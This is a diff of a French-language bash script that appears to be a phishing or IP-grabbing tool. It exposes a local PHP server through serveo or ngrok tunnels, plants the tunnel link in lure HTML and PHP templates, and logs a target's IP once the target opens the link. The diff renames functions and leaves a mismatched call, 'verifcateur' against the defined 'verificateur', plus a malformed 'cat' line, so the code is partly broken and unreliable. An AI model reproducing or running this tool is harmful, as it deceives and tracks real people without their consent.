@@ -28,7 +28,7 @@ killall -2 ssh > /dev/null 2>&1
 fi
 exit 1
 }
-dependencies() {
+dependances() {
 command -v php > /dev/null 2>&1 || { echo >&2 "J'ai besoin de php mais il n'est pas installé. Installez-le et relancez."; exit 1; }
 }
 requete_ip() {
@@ -37,13 +37,12 @@ IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP adresse cibler : \e[0m\e[1;77m %s\e[0m\n" $ip_add
 cat ipadd.txt >> Sauvegarder sous ipadd.txt
 }
-Verifions_ip_trouver() {
+verificateur() {
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cible en attente,\e[0m\e[1;77m Appuyez sur Ctrl + C pour quitter...\e[0m\n"
 while [ true ]; do
 if [[ -e "ipadd.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] La cible a ouvert le lien!\n"
-Verifion_ip_trouver
 rm -rf ipadd.txt
 fi
 sleep 0.5
@@ -119,7 +118,7 @@ sleep 10
 lien=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Lien direct: \e[0m\e[1;77m %s\e[0m\n" $lien
 charge_utile_ngrok
-Verifions_ip_trouver
+verificateur
 }
 commencons() {
 if [[ -e sendlink ]]; then
@@ -143,7 +142,7 @@ clear
 commencons
 fi
 }
-charge_utile() {
+chargeutile() {
 envoi_lien=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 sed 's+forwarding_link+'$envoi_lien'+g' faxel.html > index2.html
 sed 's+forwarding_link+'$envoi_lien'+g' modele.php > index.php
@@ -161,9 +160,9 @@ read sous_domaine
 sous_domaine="${sous_domaine:-${defaut_sous_domaine}}"
 fi
 serveur
-charge_utile
-Verifions_ip_trouver
+chargeutile
+verifcateur
 }
 logo_peche
-dependencies
+dependances
 commencons
